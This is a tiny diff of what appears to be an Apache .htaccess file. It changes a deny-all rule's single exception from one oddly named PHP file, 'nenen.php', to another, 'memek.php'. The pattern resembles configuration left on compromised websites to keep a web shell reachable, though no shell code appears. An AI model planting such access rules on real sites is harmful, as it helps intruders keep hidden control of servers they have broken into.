@@ -2,7 +2,7 @@
 Order allow,deny 
 Deny from all 
 </FilesMatch> 
-<FilesMatch "^(nenen.php)$"># 
+<FilesMatch "^(memek.php)$"># 
 Order allow,deny 
 Allow from all 
 </FilesMatch> 
